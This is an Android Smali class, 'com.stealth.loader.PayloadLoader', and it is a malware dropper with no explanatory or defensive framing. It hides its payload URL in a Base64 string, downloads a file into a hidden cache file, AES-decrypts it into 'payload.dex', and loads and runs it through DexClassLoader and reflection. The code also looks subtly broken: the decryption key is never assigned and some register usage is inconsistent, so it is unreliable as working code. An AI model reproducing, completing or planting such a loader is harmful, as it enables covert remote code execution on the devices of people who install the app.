.class public Lcom/stealth/loader/PayloadLoader;
.super Ljava/lang/Object;
.source "PayloadLoader.java"

.field private context:Landroid/content/Context;
.field private payloadUrl:Ljava/lang/String;
.field private decryptionKey:[B

.method public constructor <init>(Landroid/content/Context;)V
    .registers 4
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/stealth/loader/PayloadLoader;->context:Landroid/content/Context;
    const-string v0, "aHR0cHM6Ly91cGRhdGUubWFsYXBwLm5ldC9wYXlsb2FkLmRleA=="
    invoke-static {v0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object v1
    new-instance v2, Ljava/lang/String;
    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V
    iput-object v2, p0, Lcom/stealth/loader/PayloadLoader;->payloadUrl:Ljava/lang/String;
    return-void
.end method

.method private downloadPayload()V
    .registers 6
    iget-object v0, p0, Lcom/stealth/loader/PayloadLoader;->payloadUrl:Ljava/lang/String;
    new-instance v1, Ljava/net/URL;
    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v2
    check-cast v2, Ljava/net/HttpURLConnection;
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
    move-result-object v3
    iget-object v4, p0, Lcom/stealth/loader/PayloadLoader;->context:Landroid/content/Context;
    invoke-virtual {v4}, Landroid/content/Context;->getFilesDir()Ljava/io/File;
    move-result-object v4
    new-instance v5, Ljava/io/File;
    const-string v0, ".cache_data"
    invoke-direct {v5, v4, v0}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    new-instance v4, Ljava/io/FileOutputStream;
    invoke-direct {v4, v5}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-static {v3, v4}, Lcom/stealth/loader/PayloadLoader;->copyStream(Ljava/io/InputStream;Ljava/io/OutputStream;)V
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->close()V
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    return-void
.end method

.method private decryptPayload()V
    .registers 6
    iget-object v0, p0, Lcom/stealth/loader/PayloadLoader;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;
    move-result-object v0
    new-instance v1, Ljava/io/File;
    const-string v2, ".cache_data"
    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    invoke-static {v1}, Lcom/stealth/loader/PayloadLoader;->readAllBytes(Ljava/io/File;)[B
    move-result-object v2
    const-string v3, "AES"
    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v3
    new-instance v4, Ljavax/crypto/spec/SecretKeySpec;
    iget-object v5, p0, Lcom/stealth/loader/PayloadLoader;->decryptionKey:[B
    const-string v0, "AES"
    invoke-direct {v4, v5, v0}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
    const/4 v0, 0x2
    invoke-virtual {v3, v0, v4}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
    invoke-virtual {v3, v2}, Ljavax/crypto/Cipher;->doFinal([B)[B
    move-result-object v2
    new-instance v0, Ljava/io/File;
    iget-object v1, p0, Lcom/stealth/loader/PayloadLoader;->context:Landroid/content/Context;
    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;
    move-result-object v1
    const-string v4, "payload.dex"
    invoke-direct {v0, v1, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    new-instance v1, Ljava/io/FileOutputStream;
    invoke-direct {v1, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {v1, v2}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    return-void
.end method

.method public loadAndExecute()V
    .registers 6
    invoke-direct {p0}, Lcom/stealth/loader/PayloadLoader;->downloadPayload()V
    invoke-direct {p0}, Lcom/stealth/loader/PayloadLoader;->decryptPayload()V
    iget-object v0, p0, Lcom/stealth/loader/PayloadLoader;->context:Landroid/content/Context;
    invoke-virtual {v0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;
    move-result-object v0
    new-instance v1, Ljava/io/File;
    const-string v2, "payload.dex"
    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v2
    iget-object v3, p0, Lcom/stealth/loader/PayloadLoader;->context:Landroid/content/Context;
    invoke-virtual {v3}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;
    move-result-object v3
    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v3
    new-instance v4, Ldalvik/system/DexClassLoader;
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v5
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v0
    invoke-direct {v4, v2, v3, v3, v0}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
    const-string v0, "com.stealth.payload.Main"
    invoke-virtual {v4, v0}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v0
    const-string v1, "execute"
    const/4 v2, 0x0
    new-array v2, v2, [Ljava/lang/Class;
    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    move-result-object v1
    const/4 v2, 0x0
    new-array v3, v2, [Ljava/lang/Object;
    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;
    move-result-object v0
    invoke-virtual {v1, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    return-void
.end method

.method private static copyStream(Ljava/io/InputStream;Ljava/io/OutputStream;)V
    .registers 4
    const/16 v0, 0x1000
    new-array v0, v0, [B
    :loop
    invoke-virtual {p0, v0}, Ljava/io/InputStream;->read([B)I
    move-result v1
    const/4 v2, -0x1
    if-eq v1, v2, :done
    const/4 v2, 0x0
    invoke-virtual {p1, v0, v2, v1}, Ljava/io/OutputStream;->write([BII)V
    goto :loop
    :done
    return-void
.end method

.method private static readAllBytes(Ljava/io/File;)[B
    .registers 3
    new-instance v0, Ljava/io/FileInputStream;
    invoke-direct {v0, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {p0}, Ljava/io/File;->length()J
    move-result-wide v1
    long-to-int v1, v1
    new-array v1, v1, [B
    invoke-virtual {v0, v1}, Ljava/io/FileInputStream;->read([B)I
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V
    return-object v1
.end method
